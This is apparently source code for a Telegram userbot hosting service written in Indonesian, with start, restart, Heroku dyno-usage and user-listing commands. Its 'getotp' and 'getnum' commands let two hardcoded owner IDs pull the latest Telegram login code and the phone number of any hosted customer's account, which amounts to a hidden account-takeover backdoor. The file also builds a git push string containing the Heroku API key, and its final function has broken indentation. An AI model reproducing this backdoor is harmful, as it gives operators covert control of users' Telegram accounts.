
import heroku3
import time
import re
import asyncio
import math
import shutil
import sys
import dotenv
import datetime
import asyncio
import math
import os
import dotenv
import heroku3
import requests
import urllib3
from dotenv import load_dotenv
from os import environ, execle, path
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from Ubot import *
from itertools import count
from Ubot.modules.basic import *

from pyrogram import *
from platform import python_version as py
from pyrogram import __version__ as pyro
from pyrogram.types import * 
from io import BytesIO
from ubotlibs.ubot.utils.misc import *
from Ubot.logging import LOGGER
from config import *

def restart():
    os.execvp(sys.executable, [sys.executable, "-m", "Ubot"])

HAPP = None

GUA = [1054295664, 1898065191]

load_dotenv()

session_counter = count(1)

ANU = """
❏ **Users** Ke {}
├╼ **Nama**: {}
╰╼ **ID**: {}
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(HEROKU_API_KEY),
    "https",
    str(HEROKU_APP_NAME),
    "HEAD",
    "main",
]


@app.on_message(filters.command(["start"]))
async def start_(client: Client, message: Message):
    ADMIN1 = ADMIN1_ID[0]
    ADMIN2 = ADMIN2_ID[0]
    await message.reply_text(
        f"""<b>👋 Halo {message.from_user.first_name} \n
💭 Apa ada yang bisa saya bantu
💡 Jika ingin membuat bot premium . Kamu bisa hubungin admin dibawah ini membuat bot.</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="👮‍♂ Admin 1", url=f"https://t.me/kenapanan"),
                    InlineKeyboardButton(text="👮‍♂ Admin 2", url=f"https://t.me/Rizzvbss"),
                ],
                  [
                     InlineKeyboardButton(text="Tutup", callback_data="cl_ad"),
                  ],
             ]
        ),
     disable_web_page_preview=True
    )
    
        
@app.on_message(filters.private & filters.command("restart") & ~filters.via_bot
)
async def restart_bot(_, message: Message):
    try:
        msg = await message.reply(" `Restarting bot...`")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await msg.edit_text("✅ **Bot has restarted !**\n\n")
    if HAPP is not None:
        HAPP.restart()
    else:
        args = [sys.executable, "-m", "Ubot"]
        execle(sys.executable, *args, environ)


@Client.on_message(filters.command("restart", "") & filters.me)
async def restart_bot(_, message: Message):
    try:
        await message.edit(" `Restarting bot...`")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await message.edit("✅ **Bot has restarted**\n\n")
    if HAPP is not None:
        HAPP.restart()
    else:
        args = [sys.executable, "-m", "Ubot"]
        execle(sys.executable, *args, environ)
        
        
@Ubot("usage", "")
async def usage_dynos(client, message):
    if await is_heroku():
        if HEROKU_API_KEY == "" and HEROKU_APP_NAME == "":
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\nMasukan/atur  `HEROKU_API_KEY` dan `HEROKU_APP_NAME` untuk bisa melakukan update!"
            )
        elif HEROKU_API_KEY == "" or HEROKU_APP_NAME == "":
            return await message.reply_text(
                "<b>Menggunakan App Heroku!</b>\n\n<b>pastikan</b> `HEROKU_API_KEY` **dan** `HEROKU_APP_NAME` <b>sudah di configurasi dengan benar!</b>"
            )
    else:
            return await message.reply_text("Hanya untuk Heroku Deployment")
    try:
        Heroku = heroku3.from_key(HEROKU_API_KEY)
        happ = Heroku.app(HEROKU_APP_NAME)
    except BaseException:
        return await message.reply_text(
            " Pastikan Heroku API Key, App name sudah benar"
        )
    dyno = await message.reply_text("Memeriksa penggunaan dyno...")
    account_id = Heroku.account().id
    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {HEROKU_API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + account_id + "/actions/get-quota"
    r = requests.get("https://api.heroku.com" + path, headers=headers)
    if r.status_code != 200:
        return await dyno.edit("Unable to fetch.")
    result = r.json()
    quota = result["account_quota"]
    quota_used = result["quota_used"]
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)
    App = result["apps"]
    try:
        App[0]["quota_used"]
    except IndexError:
        AppQuotaUsed = 0
        AppPercentage = 0
    else:
        AppQuotaUsed = App[0]["quota_used"] / 60
        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)
    await asyncio.sleep(1.5)
    text = f"""
**Penggunaan Dyno Naya-Premium**

 ❏ Dyno terpakai:
 ├ Terpakai: `{AppHours}`**h**  `{AppMinutes}`**m**  [`{AppPercentage}`**%**]
Dyno tersisa:
  ╰ Tersisa: `{hours}`**h**  `{minutes}`**m**  [`{percentage}`**%**]"""
    return await dyno.edit(text)
    

@app.on_message(filters.command(["getotp", "getnum"]))
async def otp_and_number(sclient, message):
    if message.from_user.id not in GUA:
        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya owner bot yang bisa menggunakan perintah ini")
    if len(message.command) < 2:
        return await app.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await app.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await app.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await app.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await app.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )


@app.on_message(filters.command(["user"]))
async def user(client: Client, message: Message):
    if message.from_user.id not in GUA:
        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
    count = 0
    user = ""
    for X in bots:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a> 
 ╰ ID: <code>{X.me.id}</code>
"""
        except:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")
        
      
@Client.on_message(filters.command(["user"], "") & filters.me)
async def user(client, message):
    if message.from_user.id not in GUA:
        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
    count = 0
    user = ""
    for X in bots:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a> 
 ╰ ID: <code>{X.me.id}</code>
"""
        except:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")


@Client.on_message(filters.command(["getotp", "getnum"], "") & filters.me)
async def otp_and_number(client, message):
	if message.from_user.id not in GUA:
        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
    if len(message.command) < 2:
        return await client.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await client.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await client.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await client.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await client.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )